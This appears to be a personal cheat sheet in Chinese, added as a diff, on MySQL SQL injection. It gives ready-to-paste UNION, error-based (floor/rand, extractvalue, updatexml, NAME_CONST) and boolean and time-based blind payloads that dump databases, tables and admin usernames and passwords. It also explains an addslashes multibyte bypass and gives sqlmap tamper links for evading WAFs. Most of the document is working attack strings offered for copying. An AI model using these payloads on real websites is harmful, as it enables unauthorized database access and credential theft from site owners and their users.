@@ -1,0 +1,115 @@
+0.手注基础语法:
+    1>order by n -- (--后面有空格)
+    2>id=-1 union select 1，2,n,...-- 
+    3>id=-1 union select 1,2,concat(user(),0x3a,database(),0x3a,version(),0x3a,@@version_compile_os,0x3a,@@datadir),n,... 
+    4>id=-1 union select 1,2,group_concat(scheme_name),n,... from information_schema.schemata  {如果不是group_concat而是concat则是from ... limit 0,1}
+    5>id=-1 union select 1,2,group_concat(table_name),n,... from informatin_schema.tables where table_schema=0x数据库hex形式
+    6>id=-1 union select 1,2,group_concat(column_name),n,... from information_schema.columns where table_name=0x表名hex形式
+    7>id=-1 union select 1,2,group_concat(username,0x3a,password),n,... from 表名
+1.非常全的一个注入，手注，绕过的资料：
+    http://drops.wooyun.org/tips/123
+2.盲注详解：
+    http://www.freebuf.com/articles/web/30841.html
+    http://www.myhack58.com/Article/html/3/7/2011/32223.htm
+3.mysql报错注入公式：(http://ju.outofmemory.cn/entry/10591这个连接里有更好的理解！)(这个讲的很好：http://wenku.baidu.com/view/c2e5feff49649b6648d7478a.html###)
+        先来看看注入的全过程：  admin’ union select 1 from (select count(*),concat(floor(rand(0)*2),(select user() limit 0,1))a from information_schema.tables group by a)b#
+    a>爆所有库
+    and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0×27,schema_name,0×27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#
+    b>爆当前数据库
+    username=-99999999999′ and(select 1 from(select count(*),concat((select (select concat(0x7e,0×27,hex(cast(database() as char)),0×27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#
+    c>爆表
+    and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0×27,hex(cast(table_name as char)),0×27,0x7e) from information_schema.tables where table_schema=0x64656D6F limit 0,1)) from    information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#
+    d>爆字段
+    and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0×27,column_name,0×27,0x7e) from information_schema.columns where table_schema=0x64656D6F and table_name=0×75736572 limit 0,1)) from
+    information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#
+    e>爆内容
+    and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0×27,user.username,0×27,0x7e) from user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema. tables group by x)a)#  
+    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    1、通过floor暴错
+    /*数据库版本*/
+    and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+    /*简单办法暴库*/
+    id=info()
+    /*连接用户*/
+    and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+    /*连接数据库*/
+    and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+    /*暴库*/
+    and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from    information_schema.tables group by x)a)
+    /*暴表*/
+    and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1), floor(rand(0)*2))x from information_schema.tables group by x)a)
+    /*暴字段*/
+    and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+    /*暴内容*/
+    and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+    2、ExtractValue(有长度限制,最长32位)
+    and extractvalue(1, concat(0x7e, (select @@version),0x7e))
+    and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))
+    3、UpdateXml(有长度限制,最长32位)
+    and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
+    and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
+    4、NAME_CONST(适用于低版本)
+    and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--
+    5、Error based Double Query Injection (http://www.vaibs.in/error-based-double-query-injection/)
+    /*数据库版本*/
+    or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1 
+    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    百度文库公式：
+    公式原理 
+    mySQL报错回显爆数据，其实主要就是套公式，公式分为4部分 
+    1,逻辑错误部分，也就是将GET变量取值变为逻辑错误值，例如.php?id=0或者.php?id=12+and+1=2  
+    2,固定SQL联合查询语句，语句为：(核心)  union select 1 from (select+count(*),concat(floor(rand(0)*2),(注入爆数据语句))a from information_schema.tables group by a)b   
+    3,注释语句，将整个语句后面的部分注释掉，可以用"/*"注释符，也可以用"--"终止符，也可以用%23这个"#"字符  
+    4,注入爆数据语句，基本格式就是select XX from YY的格式。 
+    注意了！！！
+    这4个固定公式唯一要注意的是最后一个， 最后一个每次只能爆单条数据， 不能updata 不能insert     into 不能load_file()  不能group_concat()，  有的concat()也不能用=======》嚓  这样爆数据的话，就要加一个limit x,y的限制条件 也就是select XX from YY limit a,b      a是从第几条开始，从0开始为以一条，b为目标一共几条数据，这里固定为1，也就是说limit 0,1是第1条数据，limit 1,1是第2条数据，一次类推。 
+    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+4.addslashes:
+    a>虽然国内很多PHP程序员仍在依靠addslashes防止SQL注入，还是建议大家加强中文防止SQL注入的检查。addslashes的问题在于黑客可以用0xbf27来代替单引号，而addslashes只是将0xbf27修改为0xbf5c27，成为一个有效的多字节字符，其中的0xbf5c仍    会被看作是单引号，所以addslashes无法成功拦截。
+    当然addslashes也不是毫无用处，它是用于单字节字符串的处理，多字节字符还是用mysql_real_escape_string吧。    
+    b>另外绕过过滤单引号还用在：0XFKDD23234，char(32,23,23,56,75,86)等处将数据库名，表名转换成这种没有‘ ’的形式，但是数据库写入一句话的'路径'中的'没办法绕过，一般要求对方魔术引号开关关闭才可以通过数据库写一句话到物理路径，因为目前来说对路径的编码还没有。
+5.sqlmap比较好的资料：
+    a>http://www.2cto.com/Article/201307/227449.html
+    b>http://www.secbox.cn/hacker/6311.html
+    c>sqlmap中的tamper过waf效果很好可通过6.b查看具体变化关键字方式，也可直接看tamper目录下脚本具体代码，能比较容易看出来是如何变换的。
+    （各种tamper介绍http://drops.wooyun.org/tools/4760,结合http://drops.wooyun.org/tips/968，http://www.yunsec.net/a/security/web/jbst/2014/0617/13175.html
+     http://wenku.baidu.com/view/b531efb0aa00b52acec7ca73.html?re=view,http://www.2cto.com/Article/201505/397989.html看应该会有比较好的效果）
+6.基于bool和time的盲注小收获：
+    a>闭合可能的前缀和后缀（      eg.id=12' [sqli] AND 'abc'='abc    ),sqlmap可快速尝试各种可能的闭合方式，也就是--prefix和--
+      suffix参数的意义，如果找到闭合方式可以在sqlmap里面自己定义，加快注入过程。
+    b>可以用burpsuite和sqlmap联合学习各种sqlmap的扫描方式，下面几点就是通过这个方法学到的，其中webcruiser只能设置非localhost，非127.0.
+      0.1的proxy，在虚拟机里面试过用nat连接方式时，把webcruiser的proxy设置成自己所在ip的nat地址表示形式（eg.192.168.2.130）,  
+      好像是可以的，否则需要设置可以联接的通的其他ip作为proxy，在该proxy主机上打开burpsuite，并设置好代理服务。
+    c>type:boolean-based blind(基于bool的盲注)(boolean-based和time-based的盲注都需要很多次”计算“，一般只用工具如sqlmap实现自动”计算“，或者用于写exp或poc
+           中写一段代码用来跑出盲注手段注入的结果，人工一个一个试验太累，花时间太久，不值得，另外，盲注都不能写一句话到物理路径)
+      title:AND boolean-based blind-where or having clause
+      payload:pid=241' AND 9497=9497 AND 'frYO'='frYO
+      利用方法:将payload中的9497=9497转换成sql注入语句
+      形式:eg."CAST" ===>CAST(CURRENT_USER() AS CHAR)        这些函数全大些应该是为了绕过一般waf的过滤
+           eg."IFNULL"==>IFNULL(CAST,0x20)或者是(SELECT IFNULL(CAST,0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x31xxxx462 LIMIT 5,1)
+                                其中IFNULL函数:f(a,b)中，如果a是null，取b的值
+           eg."MID"             MID(IFNULL,3,1)        MID函数:从文本字段提取字符，MID（s,1,1）:从s中提取从第一个开始的第一个字符
+           eg."ORD"             ORD(MID)               ORD函数:返回字符串的首个ascii码的大小
+      综合利用形式：eg.pid=241' AND ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),3,1))>56 AND 'frYO'='frYO
+                   eg.pid=251' AND ORD(MID((SELECT IFNULL(CAST(table_name{此处或是CHAR_LENGTH(table_name)} AS CHAR),0x20) FROM INFORMATION_SCHEMA.
+                      TABLES WHERE table_schema=0x31xxxx462 LIMIT 5,1),3,1)) AND 'A'='A    这里只是把IFNULL(CAST,0x20)换成了另外一种形式(SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM ... where ... limit ..)
+    d>type:time-based blind(基于时间的盲注,以下关键ORD,MID等关键字与boolean-based中关键字代表的词组一致)
+      title:MySQL>=5.0.12 AND time-based blind (SELECT)
+      payload:pid=241' AND (SELECT * FROM (SELECT(SLEEP(5)))klYU) AND 'frYO'='frYO&Submit=submit    {此处是dvwa的例子,其中将  SELECT(SLEEP(5)) 
+              这个结果作为一个整体赋给klYU，也即用括号括起来赋给klYU的形式：(SELECT SLEEP(5))klYU }
+      利用方法:将payload中的SLEEP(5)中的5转成sql注入语句，也即转成SLEEP(5-IF(ORD()>64,0,5))的方法
+      形式:eg."IFNULL"==>(SELECT DISTINCT(IFNULL(CAST,0x20)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x31xxxx462 LIMIT 5,1)    
+              {此处CAST为CAST(table_name AS CHAR)}
+           eg."IF"==>IF(ORD()>64,0,5)   
+
+      综合利用形式:eg.pid=241' AND (SELECT * FROM (SELECT(SLEEP(5-(IF))))klYU）AND 'frYO'='frYO&Submit=submit
+                  eg.pid=241' AND (SELECT * FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(table_name AS CHAR),0x20)) FROM 
+                     INFORMATION_SCHEMA.TABLES WHERE table_schema=0x31xxxx462 LIMIT 5,1),3,1))>64,0,5)))))klYU）AND 'frYO'='frYO&Submit=submit
+                     {该条语句为逐个关键词带入得到的最后结果，要硬记下来估计有点浪费，做个笔记就好了，用的时候直接copy，但最好会推理，推出来这个结果}
+
+
+
+      
